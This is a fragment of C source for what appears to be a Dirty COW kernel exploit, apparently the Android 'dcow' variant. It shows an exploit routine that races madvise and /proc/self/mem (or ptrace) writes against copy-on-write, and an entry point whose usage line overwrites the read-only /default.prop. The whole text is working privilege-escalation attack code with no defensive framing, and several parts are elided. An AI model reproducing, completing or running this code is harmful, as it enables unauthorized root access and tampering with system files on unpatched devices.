...
static void exploit(struct mem_arg *mem_arg)
{
	...
	printf("[*] currently %p=%lx\r\n", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);

	mem_arg->stop = 0;
	mem_arg->success = 0;

	if (canwritetoselfmem(mem_arg) == -1) {
		printf("[*] using ptrace method\r\n");
		pid=fork();
		if(pid) {
		...
		printf("[*] using /proc/self/mem method\r\n");
		pthread_create(&pth3, NULL, checkThread, mem_arg);
		pthread_create(&pth1, NULL, madviseThread, mem_arg);
	...
	printf("[*] exploited %d %p=%lx\r\n", pid, (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);
}

int dcow(int argc, const char * argv[])
{
	if (argc < 2) {
		printf("usage %s /data/local/tmp/default.prop /default.prop\r\n", argv[0]);
		return 0;
	}
	...
	if (st2.st_size != st.st_size) {
		printf("warning: new file size (%lld) and destination file size (%lld) differ\r\n", (unsigned long long)st2.st_size, (unsigned long long)st.st_size);
		if (st2.st_size > st.st_size) {
			printf("corruption?\r\n");
		} else {
			size = st.st_size;
